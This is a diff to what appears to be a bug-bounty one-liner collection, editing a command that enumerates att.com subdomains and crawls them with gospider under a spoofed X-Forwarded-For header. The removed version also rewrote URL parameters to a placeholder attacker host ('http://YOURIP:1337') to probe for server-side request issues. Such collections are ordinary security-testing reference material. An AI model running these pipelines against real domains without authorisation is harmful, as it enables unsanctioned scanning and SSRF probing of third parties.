@@ -214,7 +214,7 @@ apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ |
 - [Explained comand](https://bit.ly/3gFJbpB)
 
 ```bash
-chaos -d att.com -o att -silent | httpx -silent | anew att1 | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -S @ |grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace 'http://YOURIP:1337' | anew | grep 'att.com ' | httpx -silent -threads 300 -sr output
+chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
 ```
 
 # Project
